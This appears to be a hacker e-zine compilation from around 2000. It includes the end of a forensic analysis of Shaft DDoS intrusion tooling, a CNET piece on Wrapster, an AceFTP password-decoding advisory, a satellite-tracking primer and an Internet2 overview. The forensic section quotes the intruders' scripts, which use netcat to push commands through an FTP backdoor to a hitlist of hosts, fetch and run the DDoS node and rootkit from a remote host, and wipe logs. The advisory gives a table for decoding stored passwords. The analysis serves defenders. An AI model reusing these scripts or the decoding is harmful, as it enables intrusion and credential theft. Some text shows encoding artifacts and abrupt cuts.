      This is the master and node executables for the Shaft DDoS tool.  For more
      information, see: http://sled.gsfc.nasa.gov/~spock/shaft_analysis.txt
      
        -rwxr-xr-x   1 0        0           19806 Nov 28 14:41 shaftnode.c
      
      This is the source file for the Shaft node program.  More information can be
      found at the same location as above. =20
      
        -rwxr-xr-x   1 0        0          165632 Nov 28 16:34 nc
      
      This appears to be the standard netcat executable. This executable was=20
      used by the scripts to remotely execute commands.
      
        -rw-r--r--   1 0        0             596 Nov 28 17:12 hitlist
      
      This file contains a list of target machines, one machine per line. These
      were evidently targets to receive the shaftnode program, having previously
      been compromised.
      
        -rwxr-xr-x   1 0        0              84 Nov 28 16:36 dos.sh
      
      This shell script run the command dospipe.sh and sends the output to each of
      the IP's in the file hitlist, port 21 (ftp).  This script is a wrapper arou=
      nd
      dospipe.sh that executes it for each of the machines in hitlist and sends i=
      t to
      the machine.  Here is the code from that file:
      
      #!/bin/sh
      for i in `cat hitlist` ; do (./dospipe.sh | ./nc -p 53982 $i 21 &) ; done
      
        -rwxr-xr-x   1 0        0             186 Nov 28 16:41 dospipe.sh
      
      This shell script outputs a series of commands that are intended to upload =
      and
      run a copy of their shaftnode executable to the target machine.  This script
      automates the process of uploading and running their node executables.  Her=
      e is
      the code for the script:
      
      #!/bin/sh
      echo "oir##t"
      echo "QUIT"
      sleep 5
      echo "cd /tmp"
      sleep 5
      echo "rcp user@host:shaftnode ./"
      sleep 5
      echo "chmod +x shaftnode"
      sleep 5
      echo "./shaftnode"
      echo "exit"
      
      The first couple lines (the first two echo commands) appear to signify that=
       a
      backdoor is being used on the target machines' ftp servers to get the roots=
      hell
      they need.  The first two lines are sent to the trojanned ftp server, and t=
      he=20
      following lines appear to be commands send to a root shell.
      
        -rwxr-xr-x   1 0        0          122880 Oct 24 02:13 duh.tar
      
      This is a tar file archive of the next five files: bd.sh, bdpipe.sh, massbd=
      .sh,
      neet.tar and unf.
      
        -rwxr-xr-x   1 0        0             104 Oct 24 01:55 unf
      
      This file is another list of IP's, presumably a list of targets for this "b=
      d"
      system.
      
        -rwxr-xr-x   1 0        0           10240 Oct 24 02:11 bd.sh
      
      This, despite its file extension, is a tar file containing the two files
      bdpipe.sh and massbd.sh.  I believe that this being a tar file is a mistake=
       and
      that is should be a shell script that resembles the script dos.sh.
      
        -rwxr-xr-x   1 0        0              53 Aug  7  1999 massbd.sh
      
      This is a shell script that iterates through all of the lines in a file and
      runs the scripts bd.sh on each of them in the background.  This means that =
      it
      runs bd.sh on each of the lines in the file roughly at the same time.  I
      suppose that the file unf is used for this purpose.  Here is the code for t=
      he
      script:
      
      #!/bin/sh
      for i in `cat $1`; do (./bd.sh $i &);done
      
        -rwxr-xr-x   1 0        0             192 Aug  8  1999 bdpipe.sh
      
      This is a file that is used to upload and install their trojans and rootkit=
      s on
      a SPARC machine, as well as delete the logs and such.  It copies neet.tar o=
      ver
      to the target machine, run the script bd, and cleans up their work.  Here is
      the code for the script:
      
      #!/bin/sh
      echo "cd /tmp;"
      echo "rcp user@host:neet.tar ./;"
      sleep 4
      echo "tar -xvf neet.tar;"
      sleep 4
      echo "./bd;"
      sleep 10
      echo "rm -rf neet.tar bd update*;"
      sleep 10
      echo "exit;"
      
      It appears that they already have a root shell by the time this script is r=
      un.
      Getting the root shell could very well be the contents of the real bd.sh.
      
        -rwxr-xr-x   1 0        0          102400 Aug  7  1999 neet.tar
      
      This is a tar file that contains 4 other files: bd (a shell script), ps,
      update, and doc (three SPARC executables).
      
        -rwx------   1 510      510          1076 Aug  5  1999 bd
      
      This is a shell script.  This is the executable that is run by the other
      scripts once a system is compromised.  This script does a number of things.
      First of all it copies in its trojaned version of inetd.  Secondly it remov=
      es
      most of the log files on the system that would implicate them.  Then it runs
      their trojaned inetd and tests it with a telnet session (presumably to test=
       the
      backdoor).  Then is kills inetd, nfs, and ttdb.  Next it runs their update
      program. Finally it copies their ps program to replace the current system o=
      ne.
      Here is the full source of this script:

      =3D
      
      We have, we hope, outlined methods for administrators to examine their
      systems for compromise by the distributors of the Shaft DDoS tool. A=20
      combination of a generic rootkit together with the DDoS package created
      a ring of machines which could be used to disrupt large network segments.
      
      The most important thing is what is repeatedly said -- apply the vendor=20
      patches for security updates and keep your system current. Access was gaine=
      d,
      no doubt, through well known holes which had patches released some time bef=
      ore
      by the vendor. This simple action would have prevented most of the nodes
      of the tool form being acquired.
      
      Secondly, any alert system administrator would have noticed the performance
      of the machine degrade for no appearant reason. The local administrators of
      this node complained of crashes and performance problems of this server, yet
      were not qualified administrators. This is a standard problem, and one that
      can be easily avoided by training or hiring competent administrators.
      
      While the steps we outlined above are above these simple, basic system level
      administration actions, prevention of this kind of compromise is easily
      done. Any organization should facilitate the spread of vendor supplied
      security patches.
      
      As noted in the introduction, we have attempted to contact the administrato=
      rs
      of the domains listed in the target lists for the distribution of the toolk=
      it
      or in the records of where the intruders connected. We are providing this
      analysis to the community in an effort to facilitate the cleanup from this=
      =20
      ring of intrusions. It spreads worldwide, including Europe and the Pacific
      Rim, focusing largely on academic instritutions. We have appreciated the=20
      response from the community when contacted, and offer to help in any additi=
      onal
      ways.

112.0 Wrapster, the Napster hack fires up the trading fires.
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

      one coming.  Or the truly anonymous napster clones a la gnutella
      that will be next.  --dr)

      Napster hack allows free distribution of software, movies 
      By John Borland Staff Writer, CNET News.com March 22, 2000, 4:15 p.m. PT 

      update       A new program has been posted on the Internet that transforms 
      a popular music-trading network into a full-blown online swap meet capable 
      of trading videos and software.

      The program, dubbed Wrapster, has been available for downloading since 
      yesterday. According to its developer, Wrapster allows any kind of file to 
      be listed and traded over the Napster network, which was designed to 
      recognize only MP3 music files. 

      CNET News.com was able to use the program to locate and download several 
      different types of files through Napster. A source at Napster said company 
      executives are aware of Wrapster but have not done anything to block its 
      use. 

      Wrapster joins a growing list of programs allowing the quick, free and 
      wide distribution of illegally copied files. The trend is bad news for 
      record companies, movie studios and software companies that have fought 
      hard to keep their wares from being pirated online. 

      Programs such as Wrapster and Nullsoft's Gnutella, which mimic and expand 
      on Napster, are quickly speeding the erosion of copyright protections 
      online, leaving copyright holders scrambling to keep up. 

      "(Copyright holders) are aggressively pursuing the issue in the courts," 
      said Peter Schalestock, an attorney with Perkins Coie. "They'd like to 
      keep up with the technology, but that is turning into an arms race." 

      Napster, a program designed to let Internet users swap music files with 
      one another, has quickly moved to the heart of the controversy over 
      pirated music and online copyrights. The software allows people to share a 
      library of MP3 music files with anyone else on the Napster system and to 
      freely download songs directly from others' computers. 

      Napster's ease of use and the huge selection of music available through 
      the system have made it a favorite among college students and other 
      communities with high-speed Internet connections. Thousands of people can 
      frequently be found on the network in the evenings, often sharing nearly a 
      million songs with their peers. 

      This has infuriated the recording industry, which views Napster as a tool 
      for piracy. The Recording Industry Association of America (RIAA) has sued 
      the company, charging that its software is facilitating the illegal 
      distribution of material. The industry is asking courts for a potentially 
      huge sum of $100,000 per illegally distributed song. 

      Watch video       "The overwhelming majority of the MP3 files offered on 
      Napster are infringing," the RIAA says on a Web page explaining its 
      position. "We believe Napster knows this and even encourages it." 

      To this point, the turmoil has been caused simply by the distribution of 
      music files. Wrapster raises the stakes, however. 

      The Wrapster program tricks the Napster software into thinking that any 
      file or set of files, including items such as software, videos or games, 
      are MP3 files. 

      Its author, identified as "Octavian" in the program's "about" file, 
      suggests using the software as a means for trading programs such as 
      Windows 2000. Octavian could not be reached for comment. 

      While aware of Wrapster, executives at Napster do not yet see it as a 
      problem. 

      "They really see it as something that's benign right now," said Dan Wool, 
      a spokesman for Napster. "Until it poses some kind of problem, they'll 
      just keep the status quo." 

      Napster proponents note that Wrapster's search capabilities aren't unique 
      online. A less well-known program dubbed iMesh allows people to swap 
      music, video and other multimedia files. That provides a broader range of 
      options than Napster itself, which only supports MP3 files, but falls 
      short of the capabilities of the new Wrapster technique. 

      The software also has spawned imitators offering expanded features. 
      Programmers at Nullsoft, the digital music player company recently 
      acquired by America Online, unveiled an open-source effort that, like 
      Wrapster, would allow any kind of file to be shared. Although AOL quickly 
      pulled the project from its site, the code is available elsewhere, and the 
      project may move ahead independently. 

      "Other programs have already tried to imitate Napster's system and even 
      taken it a step further," said Wayne Chang, a Haverhill, Mass., student 
      who manages Napster's online community bulletin boards. "Wrapster is just 
      ripping off the same idea, except this time disguising the files as the 
      only media that Napster currently recognizes." 

      The movie and software industries are watching the RIAA's experience 
      closely, aware that they'll ultimately be subjected to the same pressure. 
      They don't face the same risk of widespread piracy today because 
      high-speed Internet connections still aren't common enough to make 
      numerous downloads of their products feasible. 

      An audio MP3 file generally takes up to half an hour to download over a 
      dial-up connection and just seconds over a cable or DSL modem. A file such 
      as Windows 2000 or a Hollywood movie, however, could take all day over an 
      ordinary modem and potentially hours even over a fast connection. 

      Nevertheless, the studios and software manufacturers are doing their best 
      to protect their works against copying and to threaten potential pirates 
      with high-stakes lawsuits. 

      "It's an arms race as long as someone is trying to get around (copyright 
      protections)," said Rich Taylor, vice president of public affairs for the 
      Motion Picture Association of America (MPAA). "The only things that are 
      preventing a full-blown explosion of video entertainment on the Net are 
      the lack of high-speed connections and the need to secure that digital 
      product."

113.0 AceFTP vulnerabilty by Armour
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

      Vulnerability in AceFTP's Password Storage
      -------------------------------------------
      
      by Armour - March 2000
      
      Intro:
      ------
      Following black-hand's advisory from November 1999/January 2000 on password
      storage, it was discovered that AceFTP uses a similar character substitution
      for local storage of user passwords.
      
      Such storage is no better than a plaintext file containing the passwords.
      
      
      Applies to:
      -----------
      
      AceFTP 2.4a - not tested on earlier versions.
      
      
      Discussion:
      -----------
      
      AceFTP stores user passwords in the Sites.ini file, typically located at:
      
              (C:\Program Files\AceExpertFTP\Sites.ini)
      
      Exploit:
      --------
      
      Entering a password of abcdefghijklmnopqrstuvwxyz, we are able to derive
      the letter substitution, printed below:
      
      A= CB
      B= C8
      C= C9
      D= CE
      E= CF
      F= CC
      G= CD
      H= C2
      I= C3
      J= C0
      K= C1
      L= C6
      M= C7
      N= C4
      O= C5
      P= DA
      Q= DB
      R= D8
      S= D9
      T= DE
      U= DF
      V= DC
      W= DD
      X= D2
      Y= D3
      Z= D0
      
      Here are the contents of a sample Sites.ini file:
      
      [multu]
      Host=hhhh
      Anonymous=0
      User=h
      SavePassword=1
      Password=CBC8C9CECFCCCDC2C3C0C1C6C7C4C5DADBD8D9DEDFDCDDD2D3D0
      HostFolder=
      Port=21
      Firewall=1
      LocalFolder1=
      LocalFolder2=
      LocalFolder3=
      Comments=""
      
      Working backwards with the substitution table above, we find that
      CBC8C9CECFCCCDC2C3C0C1C6C7C4C5DADBD8D9DEDFDCDDD2D3D0 represents
      abcdefghijklmnopqrstuvwxyz.
      
      If an intruder has network or physical access to the Sites.ini file on your
      hard drive, then your passwords are compromised. The intruder will be
      able to extract all necasssery information from the file to break into 
      your account(s).

      What is PURSUiT? PURSUiT is about information. About knowledge.
      Knowledge is not power, it's an advantage. Information is the 
      real power. We will supply information, and educate on how to
      use that information. We will supply knowledge, and guide how
      to control that knowledge. 
      
      PURSUiT is here to share information, to teach the world what
      really is going in the underground. No, we will not teach how
      to make a homade atom bomb. And no, we will not instruct on how
      to kill your neighboors. We will tell you the stuff that really
      matters. 
      
      A little background. PURSUiT started somewhere in 1999, as an idea
      to get the old-school days back. To be a real, informative zine.
      We gathered some of the most skilled individuals of this industry,
      and became one. A smart man once said, that a small group of skilled
      individuals, excellent with their performance and one with their
      cause, are better than a whole army. Commandos, they called it.
      Well, I belive PURSUiT are the commandos of todays digital world.
      
      Remember the old days, the days of the BBSs, the telecommunications 
      and computers revolution, the days when "Windows" was not a fluent 
      term in more than 80% of Earth's population, the days when there were
      almost no script kiddies, when the Internet was not a "super-highway"
      and when Geocities was not formed yet. The days when true Hackers lived.
      The days of learning, days of information and days of sharing.
      
      PURSUiT is here to return these days. 
      PURSUiT is bringing back the old-school.
      
      Peace out, and keep it real, always,

              Satellites are moving targets, so when a ground station uses
      directional intennas aiming information must be available.  Your average
      daily access time for a satellite is an important quantity in determining
      how useful the satellite will be to you.
      
              A low-altitude satellite (such as SBID, Fugi-OSCAR 20, RS-10/11
      or a microsat) will generally be in range for 25 minutes or less each
      time it passes by.
      
              A satellite in high-altitude elliptical orbits for phase 3 space-
      craft (such as VBeekon, OSCAR 10 and 13) behaves very differently.  It
      will provide one or two passes per day, but the total access time will be
      (very roughly) 12 hours for Northern hemisphere stations.
      
              A geostationary satellite appears to hang motionless in the sky.
      If it's in range you'll have access to it 24 hours per day (unless the
      weather really sucks).  If it's out of range you'll never see it.
      
              Satellite enthusiasts wishing to track a satellite are intrested
      in specific information.  They want to know:
              1) When the satellite will be in range; more specifically times
                 for AOS (acquisition of signal) and LOS (loss of signal) for
                 each pass.
              2) Where to aim the antenna (azimuth and elevation) at any time.
              3) The regions of the earth that have access to the satellite.
      
              There are "2" main methods of tracking; which are the graphic
      method and the computer method.  I would like to focus on the computer meth.
      
              Tracking software naturally answers the basic tracking questions:
              It will tell you when the satellite is in range and provide you with
      antenna pointing data.  For example, at each specified time the program may
      list range (the distance between your station and the satellite), the doppler
      shift for the mode you specify (which helps you locate your downlink), the
      height of the satellite (for elliptical orbits this varies), the phase or
      mean Anomaly (a number that tells how close to you the satellites antennas
      are currently aimed), predict signal levels (on the downlink), path delay
      time (often labeled echo) and an orbit number (for refference purpose I
      believe - no effect on tracking)
      
              Lets look at the input the computer requires.  Naturally it will need
      the location of your groundstation in terms of latitude and longitude.  Some
      newer programs may even ask for your height above sea level (this shouldn't
      have any observable effect for 99.99% of amateur/satellite tracking
      programs), so even if you live in Seattle and have a monster EME antenna,
      you can just enter "0" or some approx. "#" if you don't know the correct
      value.
      
              The program also has to know the precise orbit of the satellite
      you're intrested in via orbit size, shape, orientation with respect of the
      earth/stars.  This is called orbital elemants.  Now your basically ready to
      track. For example, when I boot up my "sat box" basically one of my boxes
      just used for tracking.  A main menu pops up that asks:
              1) Do you want Batch tracking data
              2) Do you want real-time tracking data
              3) Do you want to modify parameters
              4) Move to graphical interface
              5) Exit program
      
              Once I responded by typing a single number (perhaps followed by
      the enter key)  If I respond "1" to obtain Batch tracking data, the program
      needs to know which sat. your intrested in, the date an time to start the
      calculations.
      
              We now take a look at the Batch output provided by a typical program.
      I am using the new version of IWI98:
      
      ADLMIL 3
      Ground Station: lat=39*N, long=77*W, Ht=0km
      DAY # 602 - - - Friday, August 20 - - - 1999
      UTC     AZ      EL      Doppler     Range
      HHMM    DEG     DEG     HZ          KM
      1145    167     5       -           18353
      1200    166     11      -1867       20664
      1215    165     16      -1733       22773
      1230    166     21      -1596       24694
      
      
              The heading identifies the satellite "ADLMIL 3" (HEH, I promise its
      not a military satellite ;-)) My ground station location (I had to change for
      unexplainable reasons) first 3 columns of the table show time, Azimuth and
      Elevation.  ADLMIL 3 will come in range sometime between 1145 and 1200 utc
      and remain in range for 'bout 9.5 hours.  Column 4 provides data on Doppler
      shift. AT 1200 UTC a signal coming through the mode B transponder will appear
      1867 HZ lower than predicted using the transponder frequency.  Because of
      the algorithm being used to compute Doppler shift, no value is provided for
      1145 utc, the first time the satellite comes into range.
      
              Alright just as theirs a jargon for practically everthing theirs also
      one for "Satellite Tracking" heres it broken down:
      
      Access range (acquisition distance)
      
      Acquisition distance:  Maximum distance between the subsatellite point
                             and ground station at which access to spacecraft
                             if possible
      
      AOS (Acquisition Of Signal)
      
      Apogee: Point on orbit where satellite height is maximum
      
      Azimuth: Angle in the horizontal plane measured clockwise
               with respect to North (North = 0*)
      
      Epoch (Epoch time):  A reference time at which orbital elements are
                           specified
      
      EQX (ascending node)
      
      Ground track (subsatellite path):  Path on surface of earth traced out by
                                         SSP as satellite moves through space
      
      Increment (longitudinal increment)
      
      LOS (Loss Of Signal)
      
      Node:  Point where satellite ground track crosses the equatar
      
      Pass (satellite pass)
      
      TCA (Time of Closest Approach):  Time at which satellite passes closest
                                       to a specific ground station during
                                       orbit of intrest
      
      
      
              Well, this completes my text on satellite tracking basics.  Expect
      too see more articles in the future until then "watch the sky"!!

      -----------------------------------------------------
      - Internet2 (i2) and Next Generation Internet (NGI) -
      -----------------------------------------------------
      
      Internet2 and NGI are two advanced network initiatives by the US
      government (for NGI) and UCAID (University Corporation for Advanced
      Internet Development, for i2.) The key here is initiative. What I mean is
      that you won't find physical networks that are called Internet2 and NGI.
      Both NGI and i2 run over existing high speed US Backbone networks such as
      the vBNS, Abilene, ESNet and many others (discussed later). The only real
      thing that makes i2 and NGI different from each other is who is in
      charge. You will see many NGI and i2 peers that are registered under both
      initiatives. The requirements for becoming a peer on one of these
      networks is:
           1) You have a project that requires very reliable and high-speed
              connections to another i2 peers.
           2) You have a lot of money. 
      
      The reason for these initiatives was/is:
           1) To foster high speed applications of which cannot run on the 
              existing Internet and need a guaranteed connection.
           2) To develop smarter network services and ways of guaranteeing 
              bandwidth and latency rates.
           3) To increase collaboration of National-to-National and
              National-to-International research departments (commercial, 
              academic and governmental).
      
      A question that may arise is: "Why not just upgrade the existing Internet
      and use that as the platform for advanced research?" The reason this was
      not done is because it has become obvious over time that no matter how
      much bandwidth you throw to the Internet it will be over used. So,
      instead of thinking BIGGER the NGI and i2 initiatives are mainly about
      thinking SMARTER. These networks are private to their peers and those
      peers must have a Research and Development related purpose for being
      there. This cuts out the general, bandwidth sucking, public right from
      the start. In order to keep the i2 and NGI peers from causing the same
      problems amoungst themselves advanced services and "Quality of Service"
      (QoS) systems and policies have been developed and put in place over
      these networks to keep one peer from stepping on the toes (line quality)
      of another. 
      
      The end goal of many of the advanced applications and technologies being
      developed by i2 and NGI peers is to have them introduced to the public
      and commercialized through places such as the internet. Types of
      applications already being developed involve TeleEmersion and
      TeleMedicine (to think of a few).
      
      After thinking and working *smarter* these networks will go *bigger* and
      faster. Amongst the goals of i2 and NGI is to develop the fastest and
      most efficient networks on the planet to "further the US lead in the
      global IT market" (whatever). To do so, both sides will work together on
      finding ways to work more efficiently and develop faster hardware
      devices. When at i2 and NGI conferences you may hear allot of talk about
      TeraPOP's (Terabit Points of Access). Though there are no TeraPOP's out
      there yet they are definitely on the horizon (a few years off).
      
      Practically all of the literature on the net concerning i2 and NGI are
      incomplete. The problem is that most of the papers are in M$ PowerPoint
      format, which really does no good except for the person which created it.
      It's like looking at teachers' notes when you're not the teacher; it's
      not helpful. I hope to make this somewhat complete and understandable.
      However, considering that many of the pieces of these two networks are
      still under development, don't be surprised if there are some gaps and
      you finish with more questions than you started with. My one request,
      however, is that you e-mail me at: mindmore@mindless.com with the
      questions that this article may raise and any comments/corrections you
      may have.  This article attempts to detail the services and the goals of
      both NGI and i2. I'll try not to bore you though :)
      Note: It helps if you already have an understanding of Networking (OSI
      Layers, Protocols, devices and the likes) to understand the details of i2
      and NGI. Also, I realize that there are probably allot of grammer errors,
      thanks for bearing with me.
      
      This paper is split up into 4 sections. The first discusses the Services
      provided by NGI and i2 (QoS, Multicasting, and IPv6). The second
      discusses i2 and NGI separately, covering the characteristics of the two
      individually. The third discusses the physical characteristics of the
      networks that the i2 and NGI peers connect through. The 4th, brief
      sections, discusses security issues that I see.
      
      I. Services
      ------------------------------------------------------------------------
      As I said before, both i2 and NGI support and are active in developing
      the standards for IPv6, QoS and Multicasting. I will try get into each
      networks implementation of these services later. The purpose of this
      section is to introduce you to the services I just mentioned so that you
      have a basic understanding about them.
      
      > IPv6 in brief
      IPv6, also known as IPng (IP Next Generation), is the *upgrade* to the
      currently over killed IPv4 addressing protocol. These addresses are
      called IP addresses and every computer on the net must have a unique IP
      address to communicate on the Internet. There are allot of computers on
      the net and very soon there won't be enough IPv4 addresses left for them.
      IPv4 addresses are 32-bit addresses. This allows for 4,294,967,296
      possible numbers. However, I'm guessing that after segmentation we get
      around 1.5 billion or so addresses. When this protocol was defined it was
      thought that a 32-bit address would be plenty. After all, how many
      computers could the small group of DARPA Geeks own :). However, the
      Internet became something more then a high speed government and academic
      network and into the public/global domain. Today we are coming to a point
      where we just don't have enough IP addresses. I mean, you call you ISP
      and ask them how much it would cost to get your own Static IP address
      from them. For me, with my ISP, it is $20 more a month. That is a big
      jump from FREE.
      
      So, the guys and gals at the IETF (Internet Engineering Task Force) have
      been working on IPv6, which will fix these problems. IPv6 gives us
      128-bit addresses represented in binary, of course, and Hexadecimal. 128
      bits give -18,446,744,073,709,551,616 squared- possible numbers, which
      should last us until the transition of the Internet being public/global
      to becoming extraterrestrial/public/universal. There is more to the
      protocol than just an increased address space, however. The headers
      structure of the IP packet has changed. IPv6 headers are somewhat larger
      then IPv4 headers but IPv6 headers are much more simplified. For
      instance, the IPv4 header sizes can vary whereas the IPv6 headers are
      always 40 bytes. Making the headers a fixed size allow for easier
      processing. IPv6 has also taken away some of the unused fields that were
      in IPv4 making it simpler. It has also added optional fields that can be
      used for increased security. For example IPv6 encryption headers indicate
      which encryption keys to use, and carry other handshaking information.
      
      For more info check the IPv6 related RFC's, there are a ton of them.
      
      > QoS
      One thing that people are starting to realize is that no matter how much
      bandwidth you throw to the public or private sector, they always use it
      and over use it. Though one objective of i2 and NGI is to increase
      bandwidth capacity, the other is to manage or regulate who has access to
      that bandwidth, how much of it and the quality of it. 
      The Internet currently runs as a "Best Effort" service network. This
      means that if the TIT (Tokyo Institute of Technology) NanoTech department
      needs 5mbps with no more then a 200ms delay for a joint project with MIT
      (Massachusetts Institute of Technology), over the internet they will rely
      on pure luck to get what they need. Luck that the lines from them to MIT
      will not be saturated with traffic at that time. This is a big problem,
      because this sort of luck rarely ever happens over the Internet. We need
      to develop a way to guarantee them the bandwidth and quality they need
      for that period of time.
      This is done through QoS (Quality of Service) whose development is
      primarily the job of the IETF (Internet Engineering Task Force) QoS
      workgroup. One objective of NGI and i2 is to guarantee end to end QoS.
      Which means that even if it takes 10 hops to get from TIT in Tokyo to MIT
      of if it takes 2 hops, they will be guaranteed 5mbps, 200ms, all the
      way.  Currently there are two basic standards being used for QoS: the
      RSVP protocol and DiffServ.
      
      >> RSVP (Resource ReSerVation Protocol)
      RSVP guarantees end to end bandwidth reservations and delay times from
      node too node. Unlike DiffServ, which works more in a BB (Bandwidth
      Broker, ISP)-to-BB basis or Network-to-Network basis whereas RSVP works
      on a node to node basis. This allows for tighter QoS and is necessary for
      Multicasting but is not as flexible as DiffServ. RSVP supports multicast
      groups (discussed later) and RSVP operates on top of IPv4 or IPv6 acting
      like a layer 4 protocol. RSVP, also, acts like a routing protocol though
      it does not take the place of existing routing protocols, it operates on
      top of them (adding features where needed). RSVP causes a higher strain
      on the network due to the fact that there is checking going on from node
      to node.
      
      For more information on RSVP check out rfc1633 and rfc2205
      
      >> DiffServ (Differentiated Services)
      DiffServ causes less strain on a network then does RSVP. For this reason,
      it is the preferred method. However, DiffServ doesn't guarantee the
      connection as well and as tight as RSVP does. So there are trade offs.
      DiffServ works buy labeling packets with "per-hop behaviors" (PHB's).
      PHB's basically define the level of service that this packet will need.
      The PHB is initially defined on the edge routers (closest to the sending
      device). End devices on the network have the job of reshaping traffic as
      it leaves the domain, taking into account any burst traffic that may
      occur.  DiffServ assures a basic throughput but allows for bursts when
      resource availability permits (depending on the PHB type assigned to the
      packet). All the information needed for DiffServ is held in the DS-field
      in the IP headers.
      In all likely hood we will not be implementing DiffServ on our home, or
      small networks or even large ones for that matter. It will be the
      responsibility of your BB (Bandwidth Broker, also know as your ISP) to
      provide DiffServ where needed. It will be the BB's job of aggregating all
      of their DiffServ traffic into one stream before it is sent out of the
      network and onto another.
      Last thing: DiffServ, unlike RSVP, has no built in support for
      Multicasting.
      
      For purposing of testing QoS methods the QBONE initiative was created in
      1998. The QBONE is a joint effort of academic, governmental and corporate
      researchers and engineers. Created as a wide area testbed for QoS
      protocols. It crosses both NGI and i2 borders operating through almost
      all of the advanced networks in the US and abroad  (such as vBNS,
      Abilene, ESNet, CA*NET, which are discussed later).
      
      For more details on the QBONE and QoS try
      http://www.internet2.edu/qbone/.
      
      > IP Multicasting
      Let's say that both you and I live in the same city and use the same
      Internet provider. Lets also say that we are both listening to a live
      stream (if they one day do live) of Geeks in Space
      (www.the-sync.com/geeks) at the exact same time. This means that the same
      datagrams are coming to the same network, the same POP, at the same time,
      like so:
       _____                  ____
      |Geeks|----Stream1-----|our |-------- Me 
      | in  |                |Lame|
      |Space|----Stream2-----|ISP |-------- You
       -----                  ----
      
      It would certainly be to the entire Internets advantage and ours if we
      could combine those two streams into one, creating less congestion on the
      network. IP Multicasting reefers to doing exactly that. Example:
      
       _____                  ____
      |Geeks|                |our |-------- Me 
      | in  |----Stream------|Lame|
      |Space|                |ISP |-------- You
       -----                  ----
      
      In the above example there is only one stream of datagrams going out over
      the internet but once it gets to our ISP it splits the stream into two
      and sends Geeks In Space to you and I at the same time. In order to do
      this it creates "Multicasting Groups" for each stream (both you and I
      being in the same group). It also requires smart routers which can
      replicate streams and keep track of and create these groups, dynamically
      adding users when needed. Also, the routers all along the way from the
      Real Audio server to our ISP must support IP multicast protocols such as
      DVMRP (Distance Vector Multicast Routing Protocol), PIM (Protocol
      Independent Multicast) or MOSPF (Multicast Open Shortest Path First). 
      To use IP multicasting today you must connect to an existing network
      within the public Internet known as the MBONE (at least, that is where
      all the action is at). Before you can do that, however, your ISP must
      support Multicasting. Check with them to see if they do, else, switch
      ISP's. For more information about the MBONE and IP multicasting check out

      II. NGI and i2
      ------------------------------------------------------------------------
      Like I said before, the NGI and i2 initiatives are almost identical. They
      operate on, mostly, the same networks and backbones. They have pretty
      much the same goals. However, there are a few things that make them
      different, other than who is in control of each initiative and the budget
      that they have. The following takes a look at each initiative.
      
      > NGI
      In the NGI there are a few different Government organizations that are
      involved in making the goals of NGI a reality. Those organization are
      DARPA (Defense Advanced Research Projects Agency), NSF (National Science
      Foundation), NASA (National Aeronautics and Space Administration), NIST
      (National Institute of Standards and Technology), NLM (National Library
      of Medicine) and the DoE (Department of Energy). Each of these
      organizations have different responsibilities, some overlapping in areas.
      Each of these organizations have their own physical networks that they
      can test things out on (some of which are discussed later). I'm not going
      to discuss the specifics of what their jobs are, if you want more
      information go to: www.ngi.gov
      
      NGI project budget for 1998 was $80 million US Dollars. 1999 is $110
      million. 2000 will be $110 million. The project was only granted 3 years
      of funding by Congress but planned up till 2002 (I guess the budget comes
      later). There is a possibility that it could be extended even father,
      however. There are number of very specific goals for NGI:
      To develop a NGI testbed that supports end-to-end QoS for new networking
      technologies and advanced research. This testbed will connect at least
      100 NGI sites - universities, Federal research institutions, and other
      research partners - at speeds 100 times faster than today's Internet
      (OC-3 - 155mbps), and will connect 10 sites at speeds 1,000 times faster
      than the current Internet (OC-48 - 2.5gbps).
      Another goal of the NGI is to demonstrate Terabit switching technology by
      2002. At the NGI/i2 conference I went to there was a professor from
      Hebrew University Israel who gave a lecture on an Optical Terabit switch
      that he had developed and tested. The switch could do well over 1tbps
      with hop rates of 10ms. That certainly grabbed the attention of the NSF
      guys at the conference. The device is supposed to go into production
      sometime in two years, as I remember.  
      
      The NGI network is spread out over several different networks. The ones
      that I know of are: vBNS (run by NSF), Abilene (run by UCAID), ESNet (run
      by DoE) and NREN (run by NASA).
      In order for a corporation or University to hook up to NGI they must
      connect to one of these backbones. In many cases we see where the
      requesting peer will just connect to a GigaPOP which is already connected
      to one of the backbone NAP's. Then they must arrange (with the NSF I
      believe) to be added to the NGI registrar and routing tables. In many
      cases, the organization or university can get government funding from the
      NSF.
      
      > i2
      Internet2 is an advanced network initiative by UCAID (University
      Corporation for Advanced Internet Development) and several other
      corporations. The budget is about $80 million a year. i2, like NGI, is
      spread out over various high speed backbones in the US. The two major
      ones are vBNS and Abilene, which will be discussed later. In most cases
      Universities will connect to GigaPOPs which intern connect to one of the
      i2 backbones.
      I2, like NGI, is involved with implementing and developing QoS, IPv6 and
      advanced network applications. There isno real literature on the net that
      discusses the goals of i2. The talk is more around the backbones that it
      operates on.
      
      III. Advanced high speed backbones
      ------------------------------------------------------------------------
      As I said before, both i2 and NGI run over serveral high speed backbone
      networks. The follow discusses a few of them in detail.
      
      > vBNS
      The NSF initiated the very high speed Backbone Network Service (vBNS) in
      1995. With help from MCI the NSF setup a high speed backbone across the
      US. The purpose was to connect Government, Industry and Universities to 5
      SCC's (Super Computing Centers) in the US and then, inevitable, to each
      other. For those interested, those 5 SCC's are:
      - Cornell Theory Center 
      - National Center for Atmospheric Research 
      - Pittsburgh Supercomputer Center 
      - National Center for Supercomputer Applications 
      - San Diego Supercomputer Center 
      
      The vBNS serves as a backbone for both the NGI and i2 initiatives.  The
      vBNS uses IP over ATM over SONET. It operates at speeds up to OC-48
      (2.5gbps). MCI also created a second "testnet" network for testing
      experimental technologies until they prove stable for implementation on
      the vBNS. Most Peers connect at DS3 and OC-3 speeds to one of the vBNS
      NAP's (Network Access Points) or to a GigaPOP that is already plugged up
      to a NAP. The vBNS supports both Native and Tunneled IPv6.
      
      > Abilene
      The Abilene network was created by UCAID in collaboration with Qwuest
      Communications, Cisco, Nortel Networks and a few other that I don't
      remember. Created for the sole purpose of connecting i2 peers. Operates
      at speeds up to OC-48 using IP over SONET. As I remember, the lines were
      laid and POP's put in place by Qwuest Communications. If you want to
      connect to the Abilene backbone all you need is $110k a year for a OC-3
      connection, $320k a year for a OC-12. Small price to pay :]
      
      > ESNet
      ESNet (Energy Science Network) headed by the DoE (department of Energy)
      provides for speeds up to OC-12. Connects directly to the vBNS, STARTAP
      and many other high speed US backbones. Peers connect anywhere from 64k
      up to OC-12 speeds. Been around for a while and has allot of networks
      connected to it. For more information check out: www.es.net
      
      > International networks
      It was 1997 that the NSF starting taking proposals from other R&D
      networks in other countries to add International peers to its registrar
